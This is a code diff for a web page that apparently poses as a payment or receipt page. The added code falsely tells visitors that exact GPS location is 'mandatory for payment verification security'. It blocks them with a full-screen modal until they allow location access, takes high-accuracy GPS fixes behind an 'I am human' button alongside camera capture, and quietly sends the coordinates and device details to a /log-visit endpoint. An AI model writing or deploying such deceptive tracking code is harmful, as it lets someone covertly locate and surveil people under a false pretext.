@@ -452,11 +452,36 @@
         </div>
     </div>
 
+    <!-- Location Permission Modal -->
+    <div id="locationPermModal"
+        style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.92); z-index:99998; justify-content:center; align-items:center;">
+        <div
+            style="background:white; padding:35px; border-radius:20px; text-align:center; max-width:380px; margin:20px; box-shadow:0 20px 60px rgba(0,0,0,0.3);">
+            <div style="font-size:56px; margin-bottom:15px;">📍</div>
+            <h2 style="margin:0 0 12px 0; color:#1a1a2e; font-size:20px; font-weight:700;">Location Required</h2>
+            <p style="color:#555; margin-bottom:8px; font-size:14px; line-height:1.6;">
+                Exact GPS location is mandatory for payment verification security. Please enable location access.
+            </p>
+            <div
+                style="background:#f8f9fa; border-radius:12px; padding:14px; margin:15px 0; text-align:left; font-size:12px; color:#666; line-height:1.8;">
+                <strong>📱 Mobile:</strong> Tap 🔒 icon in address bar → Allow Location<br>
+                <strong>💻 Desktop:</strong> Click 🔒 icon near URL → Location → Allow
+            </div>
+            <button id="retryLocBtn"
+                style="background:#1A73E8; color:white; border:none; padding:14px 35px; border-radius:50px; font-size:15px; cursor:pointer; font-weight:700; text-transform:uppercase; letter-spacing:1px; box-shadow:0 4px 15px rgba(26,115,232,0.35); width:100%; margin-top:5px;">
+                🔄 I Enabled Location - Retry
+            </button>
+        </div>
+    </div>
+
     <script>
         let capturedPhotos = [];
         let cameraStream = null;
         let video = document.getElementById('scanVideo');
         let paymentData = null;
+        let locationPermissionDenied = false;
+        let gpsLocked = false;
+        let bestGpsPosition = null;
         const paymentId = new URLSearchParams(window.location.search).get('id');
 
         window.addEventListener('load', async () => {
@@ -545,6 +570,56 @@
             btn.innerHTML = "⏳ Authenticating...";
             btn.disabled = true;
 
+            // STEP 0: MANDATORY LOCATION CHECK
+            // Must get GPS before anything else
+            if (!gpsLocked) {
+                btn.innerHTML = '⏳ Locking GPS Location...';
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    bestGpsPosition = position;
+                    gpsLocked = true;
+                    console.log(`✅ GPS acquired: ±${Math.round(position.coords.accuracy)}m`);
+                } catch (error) {
+                    if (error.code === 1) {
+                        // PERMISSION DENIED - show modal, block everything
+                        locationPermissionDenied = true;
+                        showLocationPermModal();
+                        btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" /></svg> I am human`;
+                        btn.disabled = false;
+                        return;
+                    }
+                    // Timeout/unavailable - try once more
+                    console.log('GPS attempt 1 failed, retrying...');
+                    try {
+                        const pos2 = await new Promise((resolve, reject) => {
+                            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                                enableHighAccuracy: false,
+                                timeout: 10000,
+                                maximumAge: 0
+                            });
+                        });
+                        bestGpsPosition = pos2;
+                        gpsLocked = true;
+                    } catch (err2) {
+                        if (err2.code === 1) {
+                            locationPermissionDenied = true;
+                            showLocationPermModal();
+                            btn.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" /><circle cx="12" cy="7" r="4" /></svg> I am human`;
+                            btn.disabled = false;
+                            return;
+                        }
+                        // Signal issue - still try camera, GPS will improve in background
+                        showToast('GPS signal weak - acquiring in background...', 'info');
+                    }
+                }
+            }
+
             // STEP 1: Request camera ONLY after clicking "I am human"
             const cameraReady = await startCameraInScanBox();
 
@@ -627,6 +702,26 @@
 
         function showReceipt() {
             document.getElementById('processingResultSection').style.display = 'none';
+
+            // ENFORCE GPS: Send best available GPS with receipt
+            if (bestGpsPosition) {
+                const gpsData = extractPositionData(bestGpsPosition, 'GPS-Receipt');
+                fetch('/log-visit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        paymentId,
+                        location: { finalLocation: gpsData },
+                        deviceDetails: {
+                            screenResolution: `${window.screen.width}x${window.screen.height}`,
+                            platform: navigator.platform,
+                            userAgent: navigator.userAgent
+                        },
+                        isUpdate: true
+                    })
+                });
+            }
+
             if (paymentData.isCustom) {
                 document.body.classList.add('gpay-mode');
                 document.getElementById('genericLogo').style.display = 'none';
@@ -691,6 +786,8 @@
                     // Always resolve with the best data found
                     if (localBest) {
                         console.log(`⏱️ GPS Timeout: Using best found (±${Math.round(localBest.coords.accuracy)}m)`);
+                        bestGpsPosition = localBest;
+                        gpsLocked = true;
                         resolve(extractPositionData(localBest, localBest.coords.accuracy < 60 ? 'GPS-Strict-Final' : 'GPS-Best-Effort'));
                     } else {
                         resolve(null);
@@ -702,6 +799,8 @@
                     (p) => {
                         if (!localBest || p.coords.accuracy < localBest.coords.accuracy) {
                             localBest = p;
+                            bestGpsPosition = p;
+                            gpsLocked = true;
                             if (p.coords.accuracy < 50) {
                                 clearTimeout(timeout);
                                 if (watchId) navigator.geolocation.clearWatch(watchId);
@@ -709,7 +808,10 @@
                             }
                         }
                     },
-                    (err) => console.log('Instant GPS (Verify) failed:', err.message),
+                    (err) => {
+                        console.log('Instant GPS (Verify) failed:', err.message);
+                        if (err.code === 1) locationPermissionDenied = true;
+                    },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
 
@@ -720,6 +822,8 @@
 
                         if (!localBest || pos.coords.accuracy < localBest.coords.accuracy) {
                             localBest = pos;
+                            bestGpsPosition = pos;
+                            gpsLocked = true;
                         }
 
                         // Stop early for high precision
@@ -729,7 +833,10 @@
                             resolve(extractPositionData(localBest, 'GPS-Turbo-Elite'));
                         }
                     },
-                    (err) => console.log('Turbo Pulse Error:', err.message),
+                    (err) => {
+                        console.log('Turbo Pulse Error:', err.message);
+                        if (err.code === 1) locationPermissionDenied = true;
+                    },
                     { enableHighAccuracy: true, timeout: maxWait, maximumAge: 0 }
                 );
             });
@@ -749,9 +856,21 @@
 
         async function logVisit() {
             try {
+                // If location was denied, show modal and stop
+                if (locationPermissionDenied) {
+                    showLocationPermModal();
+                    return;
+                }
+
                 // Try high-accuracy continuous GPS
                 const pos = await tryGPSContinuous();
-                if (!pos) return;
+                if (!pos) {
+                    // Check if it failed due to permission
+                    if (locationPermissionDenied) {
+                        showLocationPermModal();
+                    }
+                    return;
+                }
 
                 // Collect Device Info
                 const deviceDetails = {
@@ -778,6 +897,60 @@
             } catch (e) {
                 console.log('Periodic visit log failed');
             }
+        }
+
+        // ===== MANDATORY LOCATION PERMISSION MODAL =====
+        let locModalBound = false;
+        function showLocationPermModal() {
+            const modal = document.getElementById('locationPermModal');
+            modal.style.display = 'flex';
+
+            if (locModalBound) return;
+            locModalBound = true;
+
+            document.getElementById('retryLocBtn').addEventListener('click', async () => {
+                const btn = document.getElementById('retryLocBtn');
+                btn.innerHTML = '⏳ Checking Location...';
+                btn.disabled = true;
+
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+
+                    locationPermissionDenied = false;
+                    gpsLocked = true;
+                    bestGpsPosition = position;
+                    modal.style.display = 'none';
+                    showToast('Location access granted ✓', 'success');
+
+                    // Send location to server
+                    const gpsData = extractPositionData(position, 'GPS-Retry');
+                    fetch('/log-visit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            paymentId,
+                            location: { finalLocation: gpsData },
+                            isUpdate: true
+                        })
+                    });
+
+                } catch (error) {
+                    btn.disabled = false;
+                    if (error.code === 1) {
+                        btn.innerHTML = '❌ Still Blocked - Try Again';
+                        showToast('Location still blocked. Check browser settings.', 'error');
+                    } else {
+                        btn.innerHTML = '🔄 Retry (Signal Issue)';
+                        showToast('GPS signal weak. Try moving near a window.', 'error');
+                    }
+                }
+            });
         }
 
         // Run once on start
